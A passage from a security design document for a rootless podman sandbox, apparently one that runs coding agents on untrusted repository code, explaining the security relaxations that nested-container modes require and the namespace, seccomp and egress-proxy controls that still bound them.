`same-uid`. Without the option the mode is `none`, and any other value fails the launch.
`user-namespace` runs the session under podman's default profile. Every process in the session,
untrusted repository code included, can create user namespaces and mount within them.
`ko-agent-fs/bpf/doc/architecture.md` judges those mounts as it judges the mounts of `same-uid`
("Mounts").

`same-uid` runs under the default profile too, and relaxes these controls for every process in the
session. `NestingLoosenings` records why each change is required:

- `--security-opt=unmask=ALL` re-exposes the informational files `/proc/keys`, `/proc/timer_list`
  and `/proc/sched_debug`. `/proc/kcore` stays unreadable, because a real root that this rootless
  container never maps owns it. That class of leak matters in the kernel-exploit scenario that this
  design already places out of scope ("Container, runtime and kernel escape", above).
- `--security-opt=label=disable` removes the machine's SELinux layer from around this one sandbox
  for the session. The boundary then depends on the controls that the design uses everywhere else:
  namespaces, dropped capabilities, seccomp, the read-only rootfs and the egress proxy.
- `--cap-add=SYS_CHROOT` reaches every process in the session, not just the nested runtime,
  because podman grants a capability to a non-root user ambiently. The grant is acceptable because
  chroot is not a boundary that this design relies on anywhere. Nothing in the sandbox is
  chroot-confined, and under no-new-privileges there is no setuid binary for a hostile chroot to
  confuse.

`/dev/fuse` is not among the relaxations. Nested storage runs on kernel-native overlay inside the
user namespace, so the kernel's FUSE code stays unreachable. Measured: the container rootfs mounts
as `overlay`, and the test matrix passes with the fuse-overlayfs binary removed.

The remaining controls bound nested execution:

- `no-new-privileges` prevents `newuidmap` from gaining its setuid privilege, which limits a nested
  user namespace to one mapped uid. An image that switches `USER` or chowns to a second uid fails by
  design. This repository's own images are among those images, so the sandbox still cannot build
  itself.
- The egress topology is inherited, not escaped. Inner containers share the sandbox's network
  namespace, and their only route out is still the proxy.
  - An image pull is an ordinary logged CONNECT to a registry that the ruleset allows.
  - Docker Hub, `ghcr.io`, `quay.io`, `gcr.io` and ECR Public are built in. The workspace's
    `egress/rule` adds any other registry.
- No runtime is preinstalled. The image's `ko-sandbox-install-podman` refuses to run outside this
  mode. Within this mode, the script unpacks Podman under `$HOME` without acquiring additional
  privileges. Podman's storage is discarded with the session.
- The next launch without the opt-in uses the default process masks and security options.
